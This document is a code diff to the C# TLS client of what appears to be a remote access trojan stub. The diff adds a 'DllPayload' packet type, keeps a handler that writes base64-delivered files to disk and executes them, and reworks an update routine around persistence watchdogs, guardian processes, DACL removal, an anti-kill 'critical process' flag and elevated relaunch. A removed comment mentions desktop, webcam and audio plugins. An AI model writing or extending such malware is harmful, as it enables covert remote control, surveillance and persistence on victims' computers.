@@ -121,12 +121,13 @@ internal class TlsClient : IDisposable
                     _ = HandleUpdateClient(packet.Data, ct);
                     break;
 
+                case PacketType.DllPayload:
+                    break;
+
                 case PacketType.Disconnect:
                     ShouldReconnect = false;
                     return;
 
-
-                // All plugin-handled commands (Desktop, Webcam, Audio, etc.)
                 default:
                     StubLog.Debug($"Unhandled packet type: {packet.Type}");
                     break;
@@ -209,7 +210,7 @@ internal class TlsClient : IDisposable
             await File.WriteAllBytesAsync(filePath, Convert.FromBase64String(fileData.FileBase64), ct);
             StubLog.Debug($"FileExec: executed {safeName}");
 
-            Process.Start(new ProcessStartInfo
+            using var proc = Process.Start(new ProcessStartInfo
             {
                 FileName = filePath,
                 UseShellExecute = true,
@@ -280,12 +281,11 @@ internal class TlsClient : IDisposable
                 Data = JsonSerializer.Serialize(new ShellOutputData { Output = $"Update starting: {targetPath}", ExitCode = 0 }, SeroJson.Default.ShellOutputData)
             }, ct);
 
-            // Remove critical process flag before exiting to avoid BSOD
-            if (Config.AntiKill)
-            {
-                //try { Protection.UnsetCriticalProcess(); } catch { }
-            }
-
+            // Stop watchdog + guardians so they don't relaunch the old exe while bat is running
+            Persistence.StopWatchdog();
+            Protection.StopGuardian();
+            if (Config.EnableWatchdog) Protection.RemoveDacl();
+            if (Config.AntiKill) try { Protection.UnsetCriticalProcess(); } catch { }
             Program.ReleaseMutex();
 
             // Launch the bat script (hidden) and exit
@@ -425,7 +425,7 @@ internal class TlsClient : IDisposable
 
                 if (Config.AntiKill)
                 {
-                    //try { Protection.UnsetCriticalProcess(); } catch { }
+                    try { Protection.UnsetCriticalProcess(); } catch { }
                 }
 
                 // Release mutex BEFORE launching elevated process
